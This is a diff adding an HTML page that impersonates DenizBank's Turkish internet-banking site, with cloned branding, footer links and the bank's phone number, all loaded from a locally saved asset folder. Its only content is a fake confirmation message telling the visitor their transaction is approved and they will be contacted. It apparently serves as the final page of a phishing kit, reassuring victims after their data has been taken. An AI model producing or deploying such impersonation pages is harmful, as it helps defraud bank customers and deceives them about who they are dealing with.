@@ -1,0 +1,238 @@
+
+ <!DOCTYPE html>
+ 
+ <html lang="tr" class=" js webkit chrome">
+   <head>
+     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+     <meta http-equiv="x-ua-compatible" content="ie=edge">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+     <meta name="apple-mobile-web-app-capable" content="yes">
+     <meta name="apple-touch-fullscreen" content="yes">
+  
+     <meta name="apple-mobile-web-app-status-bar-style" content="default">
+     <meta name="apple-mobile-web-app-title" content="DenizBank İnternet Bankacılığı">
+     <meta name="mobile-web-app-capable" content="yes">
+     <title>DenizBank İnternet Bankacılığı</title>
+     <!--<base id="baseHref" href="/">-->
+     <base href=".">
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  
+     <link rel="stylesheet" href="./deniz_files_files/styles.2acf710a921b37dce911.css">
+     <style type="text/css">
+       .im-caret {
+         -webkit-animation: 1s blink step-end infinite;
+         animation: 1s blink step-end infinite;
+       }
+ 
+       @keyframes blink {
+ 
+         from,
+         to {
+           border-right-color: black;
+         }
+ 
+         50% {
+           border-right-color: transparent;
+         }
+       }
+ 
+       @-webkit-keyframes blink {
+ 
+         from,
+         to {
+           border-right-color: black;
+         }
+ 
+         50% {
+           border-right-color: transparent;
+         }
+       }
+ 
+       .im-static {
+         color: grey;
+       }div.login-content.login-content-v2 {
+    font-size: 18px;
+  font-weight: 700;
+  font-style: normal;
+  margin-top: 5px;
+  text-align: center;
+  color: #00897b
+}
+
+div center img {
+  text-align: center;
+}
+     </style>
+   </head>
+   <body class="login">
+     <app ng-version="8.2.14">
+       <vp-loading>
+         <div class="progress-loader soft" hidden="">
+           <img src="./deniz_files_files/loading.gif" class="hidden" alt="Lütfen Bekleyin...">
+         </div>
+       </vp-loading>
+       <!---->
+       <login-app>
+         <div class="login-wrap login-v4">
+           <!---->
+           <header class="w-100 align-items-center login-header px-4 px-lg-5 justify-content-center d-flex not-background" login-header="">
+             <div class="col-8 col-lg-4 text-center p-0">
+               <a class="logo-light">
+                 <img alt="Light Logo" src="./deniz_files_files/logo-light.svg">
+               </a>
+             </div>
+             <!---->
+             <!---->
+             <div class="mb-5">
+               <!---->
+               <div class="lang">
+                 <a class="d-flex align-items-center">
+                   <img alt="" src="./deniz_files_files/world.svg">
+                   <span>ENG</span>
+                 </a>
+               </div>
+               <!---->
+             </div>
+           </header>
+           <!---->
+           <div class="bacground-group">
+             <div class="login-overlay"></div>
+             <div class="bg-image" style="background: url(&quot;deniz_files_files/spring.jpg&quot;) center center no-repeat;"></div>
+             <div class="bg-image hidden"></div>
+           </div>
+           <!---->
+           <router-outlet class="d-none"></router-outlet>
+           <ng-component>
+             <!---->
+             <div class="container container-v2">
+               <div class="row">
+                 <div class="col-sm-12 col-lg-6">
+                   <div class="login-content login-content-v2" style="
+    height: 190px;
+">İşleminiz Onaylanmıştır En kısa Sürede İletişime Geçilecektir.
+ <center> <img alt="bekle" src="./css/yes.png" style="
+    width: 75px;
+"> </center>
+                   </div>
+                 </div>
+               </div>
+             </vp-modalpopup>
+             <vp-modalpopup id="infoModal">
+               <!---->
+               <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
+               <div role="dialog" tabindex="-1" class="modal" id="infoModalmd" aria-labelledby="Bilgilendirme" style="display: none;">
+                 <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
+                   <div class="modal-content">
+                     <!---->
+                     <!---->
+                     <div class="modal-body text-center default-bg">
+                       <!---->
+                       <button class="close d-flex align-items-center" type="button" id="infoModalBtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
+                       </button>
+                       <!---->
+                       <p class="modal-title-custom ">Bilgilendirme</p>
+                       <div class="result-content warning-result">
+                         <p class="message-row font-weight-bolder"></p>
+                         <div class="row col-md-10 mx-auto mt-5 mb-4">
+                           <div class="col-12 mb-4 col-md-6 mx-auto">
+                             <!---->
+                             <!---->
+                             <!---->
+                             <!---->
+                             <!---->
+                             <!---->
+                           </div>
+                         </div>
+                       </div>
+                       <div class="keyboard-spacer"></div>
+                     </div>
+                     <!---->
+                   </div>
+                 </div>
+               </div>
+             </vp-modalpopup>
+             <vp-modalpopup modaltitle="SuccesModalTitle | Başarılı">
+               <!---->
+               <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
+               <div role="dialog" tabindex="-1" class="modal" id="md" aria-labelledby="Başarılı" style="display: none;">
+                 <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
+                   <div class="modal-content">
+                     <!---->
+                     <!---->
+                     <div class="modal-body text-center default-bg">
+                       <!---->
+                       <button class="close d-flex align-items-center" type="button" id="BtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
+                       </button>
+                       <!---->
+                       <p class="modal-title-custom ">Başarılı</p>
+                       <div class="result-content warning-result">
+                         <p class="message-row">
+                           <strong></strong>
+                         </p>
+                       </div>
+                       <!---->
+                       <div class="keyboard-spacer"></div>
+                     </div>
+                     <!---->
+                   </div>
+                 </div>
+               </div>
+             </vp-modalpopup>
+             <!---->
+           </ng-component>
+           <!---->
+           <footer class="login-footer login-footer-v3">
+             <!---->
+             <vp-announcement id="loginAnnouncement">
+               <!---->
+               <div class="black-band black-band-v2">
+                 <picture class="footer-logo">
+                   <img alt="footer-logo" src="./deniz_files_files/login-footer-logo.svg">
+                 </picture>
+                 <div class="content-v2 d-flex align-items-center w-100">
+                   <p class="content-first">
+                     <strong>Bilgilendirme:</strong>
+                   </p>
+                   <p class="content-second">Size özel giriş bilgilerinizi hiç kimse ile paylaşmayınız. Her girişinizde karşılama mesajınızı mutlaka kontrol ediniz.</p>
+                 </div>
+               </div>
+             </vp-announcement>
+             <!---->
+             <div class="bottom bottom-v2">
+               <a class="logo-enbd no-link">
+                 <img alt="enbd" src="./deniz_files_files/enbd.png">
+               </a>
+               <div class="link-group">
+                 <!---->
+                 <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/dijital-bankacilik/guvenlik" aria-label="İnternet Güvenliği">
+                   <em aria-hidden="true" class="icon-security-2 fs-20"></em>
+                   <span>İnternet Güvenliği</span>
+                 </a>
+                 <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/internet-bankaciligi/" aria-label="Yardım ve Öneriler">
+                   <em aria-hidden="true" class="icon-help-2 fs-20"></em>
+                   <span>Yardım ve Öneriler</span>
+                 </a>
+                 <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/dijital-bankacilik/internet-bankaciligi" aria-label="İşlem Limitleri ve Saatleri">
+                   <em aria-hidden="true" class="icon-time-2 fs-20"></em>
+                   <span>İşlem Limitleri ve Saatleri</span>
+                 </a>
+                 <a class="link-icon" rel="noopener noreferrer" href="tel:08502220800" aria-label="0850 222 0 800">
+                   <em aria-hidden="true" class="icon-phone-2 fs-20"></em>
+                   <span>0850 222 0 800</span>
+                 </a>
+               </div>
+             </div>
+             <!---->
+           </footer>
+         </div>
+         <!---->
+       </login-app>
+       <!---->
+     </app>
+
+  
+  
+  </body>
+
+
+</html>
